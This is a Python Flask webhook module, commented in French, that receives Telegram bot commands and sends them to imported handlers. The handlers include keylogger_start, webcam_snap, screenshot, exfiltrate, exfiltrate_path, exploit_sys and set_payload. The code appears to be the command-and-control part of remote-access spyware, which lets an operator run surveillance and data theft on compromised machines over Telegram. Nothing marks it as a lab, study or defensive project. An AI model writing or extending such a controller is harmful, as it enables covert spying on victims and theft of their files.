# telegram/webhook.py

import os
import traceback
import asyncio
from flask import Blueprint, request, Response
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler

# 🔐 Import des clés API
from modules.utils import get_api_keys

# 📦 Import des commandes Telegram
from telegram_bot.telegram_bot import (
    menu, osint, scan, exploit_sys,
    screenshot, keylogger_start,
    webcam_snap, exfiltrate, exfiltrate_path,
    rapport, set_payload
)

# 🔐 Chargement des clés
api = get_api_keys()
TOKEN = api.get("TELEGRAM_BOT_TOKEN")
SECRET_TOKEN = api.get("TELEGRAM_SECRET_TOKEN")

# 📡 Blueprint Flask
telegram_webhook = Blueprint("telegram_webhook", __name__)

@telegram_webhook.route("/telegram/webhook", methods=["POST"])
def handle_webhook():
    try:
        # 🔐 Vérifie le token secret de Telegram
        if request.headers.get("X-Telegram-Bot-Api-Secret-Token") != SECRET_TOKEN:
            print("❌ Requête refusée : token secret invalide.")
            return Response("Unauthorized", status=403)

        # 📩 Récupération de la requête
        update_data = request.get_json(force=True)

        # ✅ Création de l'application Telegram
        app = ApplicationBuilder().token(TOKEN).build()

        # ✅ Association du bot à l'Update (corrige RuntimeError)
        update = Update.de_json(update_data, bot=app.bot)

        # ✅ Enregistrement des handlers
        app.add_handler(CommandHandler("menu", menu))
        app.add_handler(CommandHandler("osint", osint))
        app.add_handler(CommandHandler("scan", scan))
        app.add_handler(CommandHandler("exploit_sys", exploit_sys))
        app.add_handler(CommandHandler("screenshot", screenshot))
        app.add_handler(CommandHandler("keylogger_start", keylogger_start))
        app.add_handler(CommandHandler("webcam_snap", webcam_snap))
        app.add_handler(CommandHandler("exfiltrate", exfiltrate))
        app.add_handler(CommandHandler("exfiltrate_path", exfiltrate_path))
        app.add_handler(CommandHandler("rapport", rapport))
        app.add_handler(CommandHandler("set_payload", set_payload))

        # 🚀 Traitement de la commande dans une boucle asyncio propre
        async def process():
            await app.initialize()
            await app.process_update(update)
            await app.shutdown()

        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(process())
        loop.close()

        print("✅ Webhook traité avec succès.")
        return Response("OK", status=200)

    except Exception as e:
        print(f"❌ Erreur dans le webhook : {e}")
        traceback.print_exc()
        return Response("Erreur serveur", status=500)
